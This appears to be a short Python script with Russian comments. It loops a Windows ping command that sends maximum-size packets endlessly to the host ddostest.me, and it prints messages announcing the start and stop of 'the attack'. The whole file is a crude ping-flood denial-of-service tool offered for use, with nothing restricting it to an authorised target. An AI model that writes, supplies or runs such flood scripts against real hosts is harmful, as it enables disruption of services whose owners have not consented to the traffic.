import os

# Исправлено: латинская '-l' для размера пакета и '-t' для бесконечного цикла
command = "ping -l 65500 -t ddostest.me" 

print("Начинаю атаку. Чтобы остановить, нажмите Ctrl+C")

try:
    while True:
        os.system(command)
except KeyboardInterrupt:
    print("\nАтака остановлена пользователем. Хорошего дня, сэр Карданвал!")
